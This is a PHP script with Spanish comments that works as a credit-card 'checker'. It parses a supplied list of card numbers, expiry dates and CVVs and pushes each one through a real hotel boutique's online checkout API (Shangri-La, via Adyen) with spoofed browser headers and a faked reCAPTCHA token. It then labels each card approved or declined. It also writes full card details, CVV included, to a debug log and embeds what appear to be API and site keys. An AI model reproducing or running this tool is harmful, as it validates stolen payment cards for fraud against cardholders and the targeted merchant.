<?php
ignore_user_abort(true);
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// ==============================
// CONFIGURACIÓN
// ==============================
$CAPTCHA_API_KEY = "300200c245197d2f4b79d1c319a662f8";
$RECAPTCHA_V2_KEY = "6LeuX6kqAAAAAPUJ_HhZ6vT8lfObBJ36wdHuRnfj";
$RECAPTCHA_V3_KEY = "6LfgXqkqAAAAAJLWszAo8gBvzXMPBvDK-PLLJk_O";
$ADYEN_VERSION = "_0_1_25";

$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$payment_method = "adyen";
$hotel_code = "ISL";

// ==============================
// FUNCIONES DE DEBUG
// ==============================

function debugLog($message, $data = null) {
    $logMessage = date('Y-m-d H:i:s') . " - " . $message;
    if ($data !== null) {
        $logMessage .= " - " . (is_array($data) ? json_encode($data) : $data);
    }
    error_log($logMessage);
    file_put_contents('debug.log', $logMessage . PHP_EOL, FILE_APPEND);
}

function makeRequest($url, $data, $headers = [], $method = 'POST') {
    debugLog("=== MAKING REQUEST ===");
    debugLog("URL: " . $url);
    debugLog("Method: " . $method);
    debugLog("Data: ", $data);
    
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json, text/javascript, */*; q=0.01",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip",
        "Connection: keep-alive",
        "X-Requested-With: XMLHttpRequest"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    debugLog("Headers: ", $defaultHeaders);
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_HEADER => true // Incluir headers en la respuesta
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        $options[CURLOPT_POSTFIELDS] = json_encode($data);
    }
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    
    $headers = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    
    curl_close($ch);
    
    debugLog("Response HTTP Code: " . $http_code);
    debugLog("Response Headers: " . $headers);
    debugLog("Response Body: " . $body);
    debugLog("CURL Error: " . $error);
    
    return [
        'response' => $body,
        'headers' => $headers,
        'http_code' => $http_code,
        'error' => $error,
        'success' => ($http_code >= 200 && $http_code < 300) && empty($error)
    ];
}

// Función simple para obtener reCAPTCHA token (para pruebas)
function getSimpleRecaptchaToken() {
    // Para pruebas, usar un token dummy o simular
    // En producción necesitarías un servicio real
    return "TEST_RECAPTCHA_TOKEN_" . time();
}

// ==============================
// VALIDACIÓN DE ENTRADA
// ==============================

if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ No se recibió lista...'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$lista = str_replace([';',':','/','»','«','>','<','=>',' ',','], '|', $lista);
$parts = explode('|', $lista);

if (count($parts) < 4) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato incompleto',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Formato: ' . htmlspecialchars(substr($lista, 0, 50))
    ]);
    exit();
}

$cc = preg_replace('/[^0-9]/', '', $parts[0]);
$mes = preg_replace('/[^0-9]/', '', $parts[1]);
$ano = preg_replace('/[^0-9]/', '', $parts[2]);
$cvv = preg_replace('/[^0-9]/', '', $parts[3]);

// Validación básica
if (strlen($cc) < 15 || strlen($cc) > 16) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Número de tarjeta inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Número de tarjeta inválido'
    ]);
    exit();
}

if ($mes < 1 || $mes > 12) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Mes inválido',
        'html' => '<span class="badge badge-danger">✗ ERROR</span> ➔ Mes inválido'
    ]);
    exit();
}

if (strlen($ano) == 2) $ano = "20" . $ano;

// Tipo de tarjeta
$first_digit = substr($cc, 0, 1);
$cardType = "UNKNOWN";
if ($first_digit == '4') $cardType = "VISA";
if ($first_digit == '5') $cardType = "MASTERCARD";

$cardMasked = substr($cc, 0, 6) . '******' . substr($cc, -4);
$expiryMasked = sprintf('%02d', $mes) . '/' . substr($ano, -2);

debugLog("=== INICIO PROCESO ===");
debugLog("Tarjeta: " . $cardMasked);
debugLog("Tipo: " . $cardType);

// ==============================
// FLUJO PRINCIPAL
// ==============================

try {
    // PASO 1: OBTENER TOKEN DE SESIÓN
    debugLog("PASO 1: Obteniendo site_login_token");
    
    $site_login_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "password" => ""
    ];
    
    $site_result = makeRequest($api_endpoint . "/site_login.php", $site_login_data);
    
    if (!$site_result['success']) {
        debugLog("ERROR en site_login.php", $site_result);
        throw new Exception("Error al obtener token: HTTP " . $site_result['http_code']);
    }
    
    $site_response = json_decode($site_result['response'], true);
    
    if (!$site_response) {
        debugLog("Respuesta JSON inválida", $site_result['response']);
        throw new Exception("Respuesta inválida de site_login.php");
    }
    
    if (!isset($site_response['site_login_token'])) {
        debugLog("Falta site_login_token en respuesta", $site_response);
        throw new Exception("No se pudo obtener token de sesión");
    }
    
    $site_login_token = $site_response['site_login_token'];
    debugLog("✓ Token obtenido: " . substr($site_login_token, 0, 20) . "...");
    
    // PASO 2: SIMULAR reCAPTCHA (para pruebas)
    debugLog("PASO 2: Obteniendo token reCAPTCHA");
    $recaptchaToken = getSimpleRecaptchaToken();
    debugLog("✓ Token reCAPTCHA: " . $recaptchaToken);
    
    // PASO 3: CREAR ORDEN TEMPORAL (SIMPLIFICADO)
    debugLog("PASO 3: Creando orden temporal");
    
    $checkout_init_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "hotel_code" => $hotel_code,
        "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
        "order_amount" => 100,
        "payment_method" => $payment_method
    ];
    
    debugLog("Datos checkout_init: ", $checkout_init_data);
    
    $init_result = makeRequest($api_endpoint . "/checkout_init.php", $checkout_init_data);
    
    debugLog("Resultado checkout_init: ", $init_result);
    
    if (!$init_result['success']) {
        throw new Exception("Error en checkout_init.php: HTTP " . $init_result['http_code']);
    }
    
    $init_response = json_decode($init_result['response'], true);
    
    if (!$init_response) {
        throw new Exception("Respuesta JSON inválida de checkout_init.php");
    }
    
    if (isset($init_response['error'])) {
        throw new Exception("Error del servidor: " . $init_response['error']);
    }
    
    if (!isset($init_response['order_number']) || !isset($init_response['order_token'])) {
        throw new Exception("Faltan datos en respuesta: " . json_encode($init_response));
    }
    
    $order_number = $init_response['order_number'];
    $order_token = $init_response['order_token'];
    debugLog("✓ Orden creada: #" . $order_number);
    
    // PASO 4: ENVIAR CHECKOUT (con datos mínimos para probar)
    debugLog("PASO 4: Enviando checkout");
    
    $userData = [
        'first_name' => 'Test',
        'last_name' => 'User',
        'email' => 'test.user' . rand(100, 999) . '@gmail.com',
        'phone' => '+852' . rand(50000000, 99999999)
    ];
    
    $checkout_data = [
        "client_id" => $client_id,
        "promotion_id" => $promotion_id,
        "lang" => $api_locale,
        "site_login_token" => $site_login_token,
        "user_id" => "",
        "login_token" => "",
        "payment_method" => $payment_method,
        "first_name" => $userData['first_name'],
        "last_name" => $userData['last_name'],
        "email" => $userData['email'],
        "phone" => $userData['phone'],
        "chk_register" => 0,
        "chk_same_address" => 1,
        "address" => "Test Address",
        "shipping_method" => "pick_up",
        "shipping_date" => date("Y-m-d", strtotime("+2 days")),
        "shipping_time" => "12:00 - 13:00",
        "order_remark" => "",
        "alcohol_terms" => 0,
        "cutlery_service" => 1,
        "card_type" => $cardType,
        "card_issuer" => $cardType,
        "country_id" => "",
        "region" => "1",
        "district_group" => "1",
        "district" => "1",
        "pickup_store" => "",
        "is_food_site" => "1",
        "order_type" => "express",
        "recaptcha_type" => "v3",
        "recaptcha_token" => $recaptchaToken,
        "order_number" => $order_number,
        "order_token" => $order_token,
        "card_number" => $cc,
        "card_expiry_month" => $mes,
        "card_expiry_year" => $ano,
        "card_cvv" => $cvv
    ];
    
    debugLog("Datos checkout final: ", $checkout_data);
    
    $checkout_result = makeRequest($api_endpoint . "/checkout.php", $checkout_data);
    
    debugLog("Resultado checkout final: ", [
        'http_code' => $checkout_result['http_code'],
        'error' => $checkout_result['error'],
        'response_preview' => substr($checkout_result['response'], 0, 500)
    ]);
    
    if (!$checkout_result['success']) {
        throw new Exception("Error en checkout.php: HTTP " . $checkout_result['http_code']);
    }
    
    $checkout_response = json_decode($checkout_result['response'], true);
    
    if (!$checkout_response) {
        debugLog("Respuesta checkout cruda: ", $checkout_result['response']);
        throw new Exception("Respuesta JSON inválida del checkout");
    }
    
    debugLog("Respuesta checkout procesada: ", $checkout_response);
    
    // PROCESAR RESPUESTA
    if (isset($checkout_response['status'])) {
        if ($checkout_response['status'] == 'success') {
            echo json_encode([
                'status' => 'approved',
                'message' => 'Pago autorizado',
                'html' => '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                         '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                         '<span class="badge badge-success">SHANGRI-LA</span>',
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked,
                    'order_number' => $order_number
                ]
            ]);
        } else {
            $errorMsg = isset($checkout_response['error']) ? $checkout_response['error'] : 'Error desconocido';
            echo json_encode([
                'status' => 'error',
                'message' => $errorMsg,
                'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                         '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                         '<span class="badge badge-warning">' . $errorMsg . '</span>',
                'data' => [
                    'card' => $cardMasked,
                    'expiry' => $expiryMasked
                ]
            ]);
        }
    } else {
        throw new Exception("Respuesta sin status: " . json_encode($checkout_response));
    }
    
} catch (Exception $e) {
    debugLog("EXCEPCIÓN: " . $e->getMessage());
    debugLog("Trace: " . $e->getTraceAsString());
    
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-info">' . $cardType . '</span> ➔ ' .
                 '<span class="badge badge-warning">' . $e->getMessage() . '</span>',
        'data' => [
            'card' => $cardMasked,
            'expiry' => $expiryMasked
        ]
    ]);
}
?>